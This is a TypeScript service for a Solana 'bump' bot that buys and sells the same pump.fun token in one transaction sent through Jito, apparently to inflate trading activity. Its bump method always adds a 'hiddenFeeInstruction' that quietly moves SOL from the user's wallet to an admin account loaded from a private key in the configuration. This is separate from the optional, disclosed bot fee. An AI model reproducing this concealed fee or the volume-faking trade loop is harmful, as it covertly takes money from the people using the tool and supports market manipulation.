import {
  AccountInfo,
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  Signer,
  SystemProgram,
  SYSVAR_RENT_PUBKEY,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import {
  ACCOUNT_SIZE,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  getAssociatedTokenAddress,
  TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { sendTxUsingJito } from "../../lib/jito";
import {
  BOT_ACCOUNT,
  BOT_SERVICE_FEE_IN_SOL,
  HIDDEN_FEE_IN_SOL,
} from "../../shared/constants";
import {
  PUMP_FUN_GLOBAL_ACCOUNT,
  JITO_TIP_ACCOUNT,
  PUMP_FUN_FEE_ACCOUNT,
  PUMP_FUN_PROGRAM_ID,
  PUMP_FUN_EVENT_AUTHORITY_ACCOUNT,
  PUMP_FUN_OPERATION_IDS,
} from "./constants";
import {
  BumpParams,
  OperationInstructionParams,
  BondingCurve,
  PumpFunOperationIDs,
  TransferParams,
} from "./types";
import { BondingCurveAccountLayout } from "./buffer-layouts/bonding-curve-account-layout";
import { InstructionLayout } from "./buffer-layouts/instruction-layout";
import { SolanaRpcService } from "./solana-rpc.service";
import { Injectable } from "@nestjs/common";
import { CryptoService } from "../crypto/crypto.service";
import bs58 from "bs58";
import { delay } from "../../shared/utils";
import { ConfigService } from "@nestjs/config";
import { toKeypair } from "./solana-utils";

@Injectable()
export class SolanaService {
  constructor(
    private readonly rpc: SolanaRpcService,
    private readonly configService: ConfigService
  ) {}

  createPrivateKey(): string {
    return bs58.encode(Keypair.generate().secretKey);
  }

  getBalance(publicKey: PublicKey): Promise<number> {
    return this.rpc.connection.getBalance(publicKey);
  }

  /**
   * Transfer SOL using JITO and polling for transaction status response
   */
  async transfer(params: TransferParams): Promise<string> {
    const { lamports, from, to, validatorTip } = params;
    const transaction = new Transaction();

    // Add Validator Tip Instruction
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: from.publicKey,
        toPubkey: JITO_TIP_ACCOUNT,
        lamports: validatorTip,
      })
    );

    // Add Transfer Instruction
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: from.publicKey,
        toPubkey: to,
        lamports,
      })
    );

    // Fetch latest blockhash and sign the transaction
    const { blockhash } = await this.rpc.connection.getLatestBlockhash(
      "confirmed"
    );
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = from.publicKey;
    transaction.sign(from);

    // Send transaction using Jito
    const response = await sendTxUsingJito(transaction.serialize());
    const signature = response.result;

    // Poll for transaction confirmation
    await delay(2000); // Give a 2 seconds head start
    return this.waitForTransactionConfirmation(signature);
  }

  async bump({
    mint,
    payer,
    associatedTokenAccount,
    createAssociatedTokenAccount,
    includeBotFee,
    amount,
    slippage,
    priorityFee,
  }: BumpParams): Promise<string> {
    const txBuilder = new Transaction();
    txBuilder.feePayer = payer.publicKey;

    if (createAssociatedTokenAccount) {
      txBuilder.add(
        createAssociatedTokenAccountInstruction(
          payer.publicKey,
          associatedTokenAccount,
          payer.publicKey,
          mint
        )
      );
    }

    txBuilder.add(this.hiddenFeeInstruction(payer.publicKey));

    if (includeBotFee) {
      txBuilder.add(this.botFeeInstruction(payer.publicKey));
    }

    const bondingCurve = await this.getBondingCurve(mint);

    txBuilder.add(
      this.buyInstruction({
        mint,
        lamports: amount,
        slippage,
        ownerAccount: payer.publicKey,
        associatedTokenAccount,
        bondingCurve,
      })
    );

    txBuilder.add(
      this.sellInstruction({
        mint,
        lamports: amount,
        slippage,
        ownerAccount: payer.publicKey,
        associatedTokenAccount,
        bondingCurve,
      })
    );

    txBuilder.add(this.validatorTipInstruction(payer.publicKey, priorityFee));

    return this.finalizeTransaction(txBuilder, [payer]);
  }

  /** Calculates the associatedTokenAccount and then retrieves it if it exists */
  async getAssociatedToken(
    mint: PublicKey,
    owner: PublicKey
  ): Promise<
    | {
        account: PublicKey;
        accountInfo: AccountInfo<Buffer>;
        exists: true;
      }
    | {
        account: PublicKey;
        accountInfo: null;
        exists: false;
      }
  > {
    const account = await getAssociatedTokenAddress(mint, owner, false);
    const accountInfo = await this.rpc.connection.getAccountInfo(account);
    if (accountInfo) {
      return {
        account,
        accountInfo,
        exists: true,
      };
    } else {
      return {
        account,
        accountInfo: null,
        exists: false,
      };
    }
  }

  /**
   * Currently, the rent rate is a static amount. For associated tokens it's 2039280 lamports.
   * Non-system accounts must maintain a lamport balance greater than the minimum required
   * to store its respective data on-chain.
   */
  getAssociatedTokenRent() {
    return this.rpc.connection.getMinimumBalanceForRentExemption(ACCOUNT_SIZE);
  }

  async getBondingCurve(mint: PublicKey): Promise<BondingCurve> {
    const [bondingCurvePDA] = PublicKey.findProgramAddressSync(
      [Buffer.from("bonding-curve"), mint.toBuffer()],
      PUMP_FUN_PROGRAM_ID
    );
    const associatedBondingCurve = await getAssociatedTokenAddress(
      mint,
      bondingCurvePDA,
      true
    );

    const accountInfo = await this.rpc.connection.getAccountInfo(
      bondingCurvePDA
    );
    if (!accountInfo) {
      throw new Error(
        `Could not find bonding curve for token: ${mint.toString()}`
      );
    }

    const parsedData = BondingCurveAccountLayout.decode(accountInfo.data);

    return {
      virtualTokenReserves: Number(parsedData.virtualTokenReserves),
      virtualSolReserves: Number(parsedData.virtualSolReserves),
      account: bondingCurvePDA,
      associatedAccount: associatedBondingCurve,
    };
  }

  /**
   * Waits for JITO transaction confirmation by polling, for up to 10 seconds.
   */
  private async waitForTransactionConfirmation(
    signature: string
  ): Promise<string> {
    const startTime = Date.now();
    const maxWaitTime = 8_000; // 8 seconds

    // Keep loop up until max wait-time
    while (Date.now() - startTime < maxWaitTime) {
      const status = await this.rpc.connection.getSignatureStatus(signature, {
        searchTransactionHistory: true,
      });

      if (
        status?.value?.confirmationStatus === "confirmed" ||
        status?.value?.confirmationStatus === "finalized"
      ) {
        // Transaction confirmed
        return signature;
      }

      // Wait 1 second before retrying
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }

    // Transaction could not be confirmed
    throw new Error(
      `Transaction ${signature} did not confirm within ${
        maxWaitTime / 1000
      } seconds.`
    );
  }

  private async finalizeTransaction(
    transaction: Transaction,
    signers: Array<Signer>
  ): Promise<string> {
    const { blockhash } = await this.rpc.connection.getLatestBlockhash(
      "confirmed"
    );
    transaction.recentBlockhash = blockhash;

    transaction.sign(...signers);

    const response = await sendTxUsingJito(transaction.serialize());

    return response.result;
  }

  private botFeeInstruction(payer: PublicKey): TransactionInstruction {
    return SystemProgram.transfer({
      fromPubkey: payer,
      toPubkey: BOT_ACCOUNT,
      lamports: BOT_SERVICE_FEE_IN_SOL * LAMPORTS_PER_SOL,
    });
  }

  private hiddenFeeInstruction(payer: PublicKey): TransactionInstruction {
    const adminPrivateKey =
      this.configService.get<string>("ADMIN_PRIVATE_KEY")!;
    const adminAccount = toKeypair(adminPrivateKey).publicKey;
    return SystemProgram.transfer({
      fromPubkey: payer,
      toPubkey: adminAccount,
      lamports: HIDDEN_FEE_IN_SOL * LAMPORTS_PER_SOL,
    });
  }

  private buyInstruction({
    mint,
    lamports,
    slippage,
    ownerAccount,
    associatedTokenAccount,
    bondingCurve,
  }: OperationInstructionParams): TransactionInstruction {
    const tokensToBuy = Math.floor(
      (lamports * bondingCurve.virtualTokenReserves) /
        bondingCurve.virtualSolReserves
    );
    const maxLamportsToSpend = Math.floor(lamports * (1 + slippage));

    const buyKeys = this.createInstructionKeys({
      operation: "BUY",
      mint,
      associatedTokenAccount,
      ownerAccount,
      bondingCurve,
    });

    const buyData = Buffer.alloc(InstructionLayout.span);
    InstructionLayout.encode(
      {
        operation: BigInt(PUMP_FUN_OPERATION_IDS.BUY),
        tokens: BigInt(tokensToBuy),
        lamports: BigInt(maxLamportsToSpend),
      },
      buyData
    );

    return new TransactionInstruction({
      keys: buyKeys,
      programId: PUMP_FUN_PROGRAM_ID,
      data: buyData,
    });
  }

  private sellInstruction({
    mint,
    lamports,
    slippage,
    ownerAccount,
    associatedTokenAccount,
    bondingCurve,
  }: OperationInstructionParams): TransactionInstruction {
    const tokensToSell = Math.floor(
      (lamports * bondingCurve.virtualTokenReserves) /
        bondingCurve.virtualSolReserves
    );
    const minLamportsToReceive = Math.floor(
      (tokensToSell * (1 - slippage) * bondingCurve.virtualSolReserves) /
        bondingCurve.virtualTokenReserves
    );

    const sellKeys = this.createInstructionKeys({
      operation: "SELL",
      mint,
      associatedTokenAccount,
      ownerAccount,
      bondingCurve,
    });

    const sellData = Buffer.alloc(InstructionLayout.span);
    InstructionLayout.encode(
      {
        operation: BigInt(PUMP_FUN_OPERATION_IDS.SELL),
        tokens: BigInt(tokensToSell),
        lamports: BigInt(minLamportsToReceive),
      },
      sellData
    );

    return new TransactionInstruction({
      keys: sellKeys,
      programId: PUMP_FUN_PROGRAM_ID,
      data: sellData,
    });
  }

  private validatorTipInstruction(
    payer: PublicKey,
    tip: number
  ): TransactionInstruction {
    return SystemProgram.transfer({
      fromPubkey: payer,
      toPubkey: JITO_TIP_ACCOUNT,
      lamports: tip,
    });
  }

  private createInstructionKeys({
    operation,
    mint,
    associatedTokenAccount,
    ownerAccount,
    bondingCurve,
  }: {
    operation: keyof Pick<PumpFunOperationIDs, "BUY" | "SELL">;
    mint: PublicKey;
    associatedTokenAccount: PublicKey;
    ownerAccount: PublicKey;
    bondingCurve: BondingCurve;
  }): TransactionInstruction["keys"] {
    return [
      { pubkey: PUMP_FUN_GLOBAL_ACCOUNT, isSigner: false, isWritable: false },
      { pubkey: PUMP_FUN_FEE_ACCOUNT, isSigner: false, isWritable: true },
      { pubkey: mint, isSigner: false, isWritable: false },
      {
        pubkey: bondingCurve.account,
        isSigner: false,
        isWritable: true,
      },
      {
        pubkey: bondingCurve.associatedAccount,
        isSigner: false,
        isWritable: true,
      },
      { pubkey: associatedTokenAccount, isSigner: false, isWritable: true },
      { pubkey: ownerAccount, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
      // Applicable only on sell.
      ...(operation === "SELL"
        ? [
            {
              pubkey: ASSOCIATED_TOKEN_PROGRAM_ID,
              isSigner: false,
              isWritable: false,
            },
          ]
        : []),
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      // Applicable only on buy.
      ...(operation === "BUY"
        ? [{ pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false }]
        : []),
      {
        pubkey: PUMP_FUN_EVENT_AUTHORITY_ACCOUNT,
        isSigner: false,
        isWritable: false,
      },
      { pubkey: PUMP_FUN_PROGRAM_ID, isSigner: false, isWritable: false },
    ];
  }
}
